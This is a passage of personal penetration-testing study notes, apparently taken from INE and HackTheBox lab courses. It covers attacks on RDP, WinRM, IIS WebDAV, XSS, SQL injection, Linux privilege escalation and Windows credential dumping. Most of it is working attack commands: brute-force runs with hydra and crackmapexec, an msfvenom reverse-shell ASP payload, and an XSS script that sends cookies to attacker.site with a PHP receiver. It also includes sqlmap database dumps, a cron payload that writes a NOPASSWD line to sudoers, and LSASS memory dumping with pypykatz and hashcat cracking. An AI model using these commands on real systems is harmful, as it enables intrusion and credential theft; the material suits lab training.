        	auxiliary/scanner/rdp/cve_2019_0708_bluekeep 
            	exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
        show targets //check which versions are vulnerable to this exploit.
            + To identify a target correctly, we will need to:
                - Obtain a copy of the target binaries
                - Use msfpescan to locate a suitable return address
###RDP 
* Maybe it is on another port than 3389
* Metasploit
	use auxiliary/scanner/rdp/rdp_scanner
      	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.188.126 -s 3333
      	xfreerdp /u:administrator /p:qwertyuiop /v:192.168.188.126:3333

###WinRM
* We can utilize crackmapexec to perform a brute-force on WinRM and we can also utilize a ruby script called evil-winrm to obtain a command shell session on the target system
[+] WinRM is tipically used in the following ways:
	> Remotely access and interact with Windows hosts on a local network
  	> Remotely access and  execute commands on Windows systems on the internet
  	> Manage and configure Windows systems remotely
* WinRM typically uses TCP port 5985 and 5986(HTTPS)
  	crackmapexec winrm 192.168.188.126 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
  	crackmapexec winrm 192.168.188.126 -u administrator -p tinkerbell -x "whoami"
[+] Obtain a command shell
	> With evil-winrm
  		evil-winrm -i 10.129.69.58 -u 'administrator' -p 'tinkerbell' ==> 
	> With Metasploit
    		First of all, we need to know the auth methods allowed.
    			auxiliary/scanner/winrm/winrm_auth_methods
    		Check the URI. Maybe /wmsan works
    		Valid credentials
    		  	auxiliary/scanner/winrm/winrm_login 
    		    		set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
    		    		set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    		Can we execute commands?
    			auxiliary/scanner/winrm/winrm_cmd
    			Set username, password and cmd = whoami
    		Let's gain a shell
    		  	search winrm_script_exec
    		  	set force_vbs true

###Hydra
	hydra -U rdp //-U for a module
  		-M : List of servers to attack
  	hydra -h | grep -i "Supported services" //To check the available modules
###IIS
* It can be used to host both static and dynamic web pages developed in ASP.NET and PHP
[+] Supported executable file extensions
	.asp
        .aspx
        .config
        .php
[+] WebDAV
	OJO!! The IIS server is not exploitable if the root folder is protected. Also if the root folder is protected, there is no way to determine if WebDAV is even enabled.
      	It is configued to run on the IIS web server
      	In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.
      	> Tools
      		davtest(Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files)
      	  	cadaver(Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc)
      		nmap -sV -p80 --script=http-enum 10.2.17.124
      	    	hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
	> Example
		//How to use curl with credentials
      			First method. Read parameters from a file
      	      			1. Creating a file my_password_file.txt
      	      		  	2. machine example.com
      	      		  	   login USERNAME
      	      		  	   password PASSWORD
      	      		  	3. curl --netrc-file my_password_file.txt http://10.2.31.211/webdav/
      	      		Second method. Read parameters from stdin
      	      		  	curl -s -X GET http://10.2.17.24/webdav/ -K- <<<--user bob:password
      		davtest -url http://10.2.17.124/webdav -auth bob:password_123321 
      	    	cadaver http://10.2.17.124/webdav 
      	    		put /usr/share/webshells/asp/webshell.asp
      	    	Or we could use curl to upload a file
      	    		curl -T 'shell.txt' 'http://$ip'
      	    	After that delete webshell.asp
[+] Metasploit
	Listen manually
        	nmap -sV -p80 --script=http-enum 10.2.30.233
            	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4126 -f asp > shell.asp //It is recommended to use 32 architecture because it will works on both
            	service postgreSQL start 
            	msfconsole -q
            	use multi/handler
            	  set payload windows/meterpreter/reverse_tcp
            	  set lhost 10.10.5.2
            	  set lport 4126

        search  iis upload
        	exploit/windows/iis/iis_webdav_upload_asp
            	set HttpPassword 
            	set HttpUsername
            	set PATH /webdav/metasploit.asp
###XSS 
* Finding an XSS is sometimes just a matter of injecting a harmless tag like 
	<i> : italics
      	<pre>
      	<plaintext>
      	<h1>Hello</h1>
* Some valid HTML/Javascript code
	<script>alert('XSS')</script>
      	<script>alert(window.location.hostname)</script>
      	<script>alert(document.cookie)</script> [Remember parameter http-only is very important for no access by javascript(document.cookie),java,etc.]
* Reflected XSS attacks
	//Is called reflected because an input field of the HTTP request sent by the browser gets inmediately reflected to the output page.
    	//When the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website. When users click on the link, they trigger the attack.

		http://victim.site/search.php?find=<payload>

* Stored XSS attacks
	//When the payload is sent to the vulnerable web server and then stored. The malicious code gets delivered each and every time a web browser hits the "injected" web page.
	//Cookie stealing via XSS. [Javascript can access cookies if they do not have the HttpOnly flag enabled.]
		<script>alert(document.cookie)</script>
    	//With the following code, you can send cookies content to an attacker-controlled site. The script generates an image object and points its src to a script on the attacker's server(attacker.site)
	//You post this in the vulnerable field
      		<script>
      		var i = new Image();
      		i.src="http://attacker.site/log.php?q="+escape(document.cookie);
      		</script>

      	//The log.php script saves the cookie in a text file on the attacker.site
      		<?php 
      		$filename="/tmp/log.txt";
      		$fp=fpopen($filename, 'a');
      		$cookie=$_GET['q'];
      		fwrite($fp, $cookie);
      		fclose($fp);
      		?>

      	//Another script
      		<?php
      		$ip = $_SERVER['REMOTE_ADDR'];
      		$browser = $_SERVER['HTTP_USER_AGENT'];
      		$fp = fopen('jar.txt', 'a');

      		fwrite($fp, $ip. ' '.$browser." \n");
      		fwrite($fp, urldecode($_SERVER['QUERY_STRING']). "  \n\n");
      		fclose($fp);
      		?>
* xsser 
	(with POST)
		xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' //The -p is from burpsuite
      		  --auto
      		  --Fp: Final payload //<script>alert("XSS")</script>
	(with GET)
      		xsser --url ... //Change 'nmap' by XSS ==> poll request //Remember
	URLs and books
  		The web application hacker's handbook by Dafydd Stuttard

###SQLi
* Comments
	'#' symbol
    	-- (two dashes followed by a space)
* Static query example inside a PHP page
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); // Object referencing the connection to the database
    	$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
    	
    	
    	$results = mysqli_query($connection, $query); //Function which submits the query to the database
    	display_results($results); //Renders the data
    	?>

* Dynamic query
	<?php
    	$dbhostname='1.2.3.4';
    	$dbuser='username';
    	$dbpassword='password';
    	$dbname='database';
    	
    	$id = $_GET['id']; //Using user-supplied input to build a query
    	
    	$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
    	$query = "SELECT Name, Description FROM Products WHERE ID='$id';";
    	
    	$results = mysqli_query($connection, $query);
    	display_results($results);
    	?>

	[+] One example of SQLi
		We can change the $id value to something like
    	  		' OR 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a'; //This tells the database to select all the items in the Products table.

    	[+] Other example
    	  	Using UNION command
    	  	  	' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
    	  	The query then becomes:
    	  	  	SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

* Finding SQL injections
	[+] string terminators: ' and "
    	[+] SQL commands: SELECT, UNION and others
    	[+] SQL comments: # or -- 
    	[+] In POST ==> username=userna'me&password=password

* Exploiting a boolean based SQLi
	user() //Current user using the database
    	substring() //Returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length
    		mysql > select substring('elearnsecurity', 2, 1);
    	  	mysql > select substring(user(), 1, 1) = 'r'; //To test True/False condition

		Combining those features, we can iterate over the letters of the username by using payloads such as:
    			[+] ' or substr(user(), 1, 1) = 'a
    		  	[+] ' or substr(user(), 1, 1) = 'b
    		  	...

    		When we find the first letter, we can move to the second:
    		  	[+] ' or substr(user(), 2, 1) = 'a
    		  	[+] ' or substr(user(), 2, 1) = 'b
    		  	...

* Exploiting UNION based SQLi
	[+] When some of the results of a query are directly displayed on the output page.
    		' UNION SELECT user(); -- -
    	[+] The query then becomes:
    		SELECT description FROM items WHERE id='' UNION SELECT user(); -- -'; //The third dash is because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

	[+] Examples
		' UNION SELECT null; -- -
      		' UNION SELECT null,null; -- - //We need to know how many fiels are there

	[+] When we know the number of fields, it is time to test which fields are part of the output page.
		' UNION SELECT 'elsid1', 'elsid2'; -- - 

  
* SQLMap
	[+] When you want to read from a file, save it from Burpsuite
		sqlmap -r /root/bloglogin.req -p user --technique=B --banner -v3 
			--flush-session
		sqlmap -r request -p title --os-shell
		sqlmap -u http://victim.site/view.php?id=1441' -p id --technique=U //UNION based SQLi technique
    		sqlmap -u http://victim.site/view.php?id=1441 -b //banner
    		sqlmap -u http://victim.site/view.php?id=1441 --tables //tables
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --columns
    		sqlmap -u http://victim.site/view.php?id=1441 --current-db selfi4you --dump
    		sqlmap -u http://victim.site/view.php?id=1441' -p search --technique=U --banner -v3 --fresh-queries
    			--current-db
    		  	--current-user
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb --tables
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users --columns
    		sqlmap -u http://victim.site/view.php?id=n' -p search --technique=U  -D blogdb -T users -C username,password --dump

	[+] If you have to exploit a POST parameter:
    		> With sqlmap
    	  		sqlmap -u <URL> --data=<POST string> -p parameter [options] //Copy the POST string from a request intercepted with Burp Proxy
    	  	  	sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
    	  	> With Burpsuite
    	    		username=a' or 1=1; -- -&pass=a //We could test one field and the other to see which is vulnerable

	[+] Another way
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title --dbs
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP --tables
       		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users --columns 
		sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
      






##Exploitation
#=
###Linux Kernel Exploitation
* Github
	https://github.com/mzet-/linux-exploit-suggester
  	wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
* Meterpreter
	meterpreter > 
  		shell
  	  	/bin/bash -i
  	  	sysinfo
  	  	getuid
    
* Cron Jobs
    Any script or command that have been configured to be run as the "root" user and is run by a Cron Job will run as the root user and will consequently provide us with root access.
    	crontab -l
    	cd /
    	grep -rnw (or -nri) /usr -e "/home/student/message" or find / -name message  //Find if a file with the same name exists on the system
    	printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

* Exploiting SUID Binaries
	strings welcome
    	rm -rf greetings
    	cp /bin/bash greetings
    	./welcome

###Password attacks
    > The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:
cry0l1t3	    :x	                :1000	    :1000	    :cry0l1t3,,,	        :/home/cry0l1t3	    :/bin/bash
Login name		Password info		UID		    GUID		Full name/comments		Home directory		Shell
    > The /etc/shadow file has a unique format in which the entries are entered and saved when new users are created.
    								
htb-student:	$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:	18955:	                0:	        99999:	    7:	                :	                    :	                :
<username>:	    <encrypted password>:	            <day of last change>:	<min age>:	<max age>:	<warning period>:	<inactivity period>:	<expiration date>:	<reserved field>
    
    > The encryption of the password in this file is formatted as follows:
    		
$ <id>	$ <salt>	$ <hashed>
$ y	    $ j9T	    $ 3QSBB6CbHEu...SNIP...f8Ms
    > The type (id) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.
ID	Cryptographic Hash Algorithm
$1$	            MD5
$2a$	        Blowfish
$5$	            SHA-256
$6$	            SHA-512
$sha1$	        SHA1crypt
$y$	            Yescrypt
$gy$	        Gost-yescrypt
$7$	            Scrypt

    > However, a few more files belong to the user management system of Linux. The other two files are /etc/passwd and /etc/group. In the past, the encrypted password was stored together with the username in the /etc/passwd file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The /etc/shadow file can only be read by the user root.

The shadow file can only be accessed by the root account.
  	value     Hashing algorithm
  	$1        MD5
  	$2        Blowfish
  	$5        SHA-256
  	$6        SHA-512
	> Example:
      		msfconsole ==> hashdump
      		cat /etc/shadow

* /etc/passwd
    						
htb-student:	x:	        1000:	1000:	,,,:	    /home/htb-student:	/bin/bash
<username>:	    <password>:	<uid>:	<gid>:	<comment>:	<home directory>:	<cmd executed after logging in>

    > The x in the password field indicates that the encrypted password is in the /etc/shadow file. However, the redirection to the /etc/shadow file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user root does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.


[+] Windows Authentication Process  
    > The Windows client authentication process can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The Local Security Authority (LSA) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (SIDs).

    > The security subsystem keeps track of the security policies and accounts that reside on a computer system. In the case of a Domain Controller, these policies and accounts apply to the domain where the Domain Controller is located. These policies and accounts are stored in Active Directory. In addition, the LSA subsystem provides services for checking access to objects, checking user permissions, and generating monitoring messages.

    https://academy.hackthebox.com/storage/modules/147/Auth_process1.png

    > Local interactive logon is performed by the interaction between the logon process (WinLogon), the logon user interface process (LogonUI), the credential providers, LSASS, one or more authentication packages, and SAM or Active Directory. Authentication packages, in this case, are the Dynamic-Link Libraries (DLLs) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package Msv1_0.dll is used.

    > Winlogon is a trusted process responsible for managing security-related user interactions. These include:
        + Launching LogonUI to enter passwords at login
        + Changing passwords
        + Locking and unlocking the workstation
    > It relies on credential providers installed on the system to obtain a user's account name or password. Credential providers are COM objects that are located in DLLs.
    > Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.


* LSASS
    > Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in %SystemRoot%\System32\Lsass.exe. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture here ==> (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN)

Authentication Packages	    Description
Lsasrv.dll	                The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which 
                            selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.
Msv1_0.dll	                Authentication package for local machine logons that don't require custom authentication.
Samsrv.dll	                The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.
Kerberos.dll	            Security package loaded by the LSA for Kerberos-based authentication on a machine.
Netlogon.dll	            Network-based logon service.
Ntdsa.dll	                This library is used to create new records and folders in the Windows registry.

    > Each interactive logon session creates a separate instance of the Winlogon service. The Graphical Identification and Authentication (GINA ==> https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the LSALogonUser (https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

* SAM database
    > The Security Account Manager (SAM ==> https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.
    > Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (DC) must validate the credentials from the Active Directory database (ntds.dit), which is stored in %SystemRoot%\ntds.dit.
    > Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the SYSKEY (syskey.exe) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.

    > (https://academy.hackthebox.com/storage/modules/147/authn_credman_credprov.png)

    > Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's Credential Locker. Credentials are encrypted and stored at the following location:
        PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
    > There are various methods to decrypt credentials saved using Credential Manager. We will practice hands-on with some of these methods in this module.

* NTDS

    > It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called NTDS.dit that is kept synchronized across all Domain Controllers with the exception of Read-Only Domain Controllers(https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

        + User accounts (username & password hash)
        + Group accounts
        + Computer accounts
        + Group policy objects



[+] Attacking LSASS
    > Upon initial logon, LSASS will:

        + Cache credentials locally in memory
        + Create access tokens (https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
        + Enforce security policies
        + Write to Windows security log (https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

    > Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.

* Dumping LSASS 
    > Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.
Task Manager Method

    > With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:
        + Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
        + A file called lsass.DMP is created and saved in:
        + Task Manager Method
            C:\Users\loggedonusersdirectory\AppData\Local\Temp
        + This is the file we will transfer to our attack host. We can use the file transfer method discussed in the Attacking SAM section of this module to transfer the dump file to our attack host.

    > Rundll32.exe & Comsvcs.dll Method

        + The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe(https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.
        
        + Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:
            => Finding LSASS PID in cmd
                + From cmd, we can issue the command tasklist /svc and find lsass.exe and its process ID in the PID field.
                + Finding LSASS PID in cmd
                    C:\Windows\system32> tasklist /svc
            => Finding LSASS PID in PowerShell

                + From PowerShell, we can issue the command Get-Process lsass and see the process ID in the Id field.
                + Finding LSASS PID in PowerShell
                    PS C:\Windows\system32> Get-Process lsass
        + Once we have the PID assigned to the LSASS process, we can create the dump file.
            => Creating lsass.dmp using PowerShell
                + With an elevated PowerShell session, we can issue the following command to create the dump file:
                    PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
                + With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

                + If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.
                + Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.


    > Using Pypykatz to Extract Credentials

        + Once we have the dump file on our attack host, we can use a powerful tool called pypykatz(https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.
        + Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.
        + Running Pypykatz

            > The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:
                m1l0js@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
            > Lets take a more detailed look at some of the useful information in the output.
                sid S-1-5-21-4019466498-1700476312-3544718034-1001
                luid 1354633
                	== MSV ==
                		Username: bob
                		Domain: DESKTOP-33E7O54
                		LM: NA
                		NT: 64f12cddaa88057e06a81b54e73b949b
                		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
                		DPAPI: NA
            > MSV(https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT & SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.
                	== WDIGEST [14ab89]==
		                username bob
		                domainname DESKTOP-33E7O54
		                password None
		                password (hex)
            > WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update here(https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).
                	== Kerberos ==
		                Username: bob
		                Domain: DESKTOP-33E7O54
            > Kerberos(https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
                	== DPAPI [14ab89]==
		                luid 1354633
		                key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		                masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		                sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
            > The Data Protection Application Programming Interface or DPAPI(https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:
            > Applications	Use of DPAPI
            Internet Explorer	        Password form auto-completion data (username and password for saved sites).
            Google Chrome	            Password form auto-completion data (username and password for saved sites).
            Outlook	                    Passwords for email accounts.
            Remote Desktop Connection	Saved credentials for connections to remote machines.
            Credential Manager	        Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.
            
            > Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the Windows Privilege Escalation module.

* Cracking the NT Hash with Hashcat

    > Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the Attacking SAM section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
        m1l0js@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

[+] Attacking Active Directory & NTDS.dit
    > Active Directory (AD) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack & defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive & significant topic that we have multiple modules covering AD.
    > In this section, we will focus primarily on how we can extract credentials through the use of a dictionary attack against AD accounts and dumping hashes from the NTDS.dit file.
    > Like many of the attacks we have covered thus far, our target must be reachable over the network. This means it is highly likely that we will need to have a foothold established on the internal network to which the target is connected. That said, there are situations where an organization may be using port forwarding to forward the remote desktop protocol (3389) or other protocols used for remote access on their edge router(https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) to a system on their internal network. Please know that most methods covered in this module simulate the steps after an initial compromise, and a foothold is established on an internal network. Before we get hands-on with the attack methods, let's consider the authentication process once a Windows system has been joined to the domain. This approach will help us better understand the significance of Active Directory and the password attacks it can be susceptible to.
        (https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png)

    > Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform. It can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network. Keep in mind that we can also study NTDS attacks by keeping track of this technique(https://attack.mitre.org/techniques/T1003/003/).

* Dictionary Attacks against AD accounts using CrackMapExec

    > Keep in mind that a dictionary attack is essentially using the power of a computer to guess a username &/or password using a customized list of potential usernames and passwords. It can be rather noisy (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of Group Policy (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)).
    > When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to custom tailor our attack as much as possible. In this case, we can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website. Doing this can result in us gaining the names of employees that work at the organization. One of the first things a new employee will get is a username. Many organizations follow a naming convention when creating employee usernames.
    > Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username.
    > A tip from MrB3n: We can often find the email structure by Googling the domain name, i.e., “@inlanefreight.com” and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid. 

    > Creating a custom list of usernames
        + We can manually create our list(s) or use an automated list generator such as the Ruby-based tool Username Anarchy(https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using Git, we can run it against a list of real names as shown in the example output below:
            m1l0js@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
    > Launching the Attack with CrackMapExec
        + Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:
            m1l0js@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
        + If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.
    > Event logs from the attack
        eventvwr > Windows Logs > Security > 4776
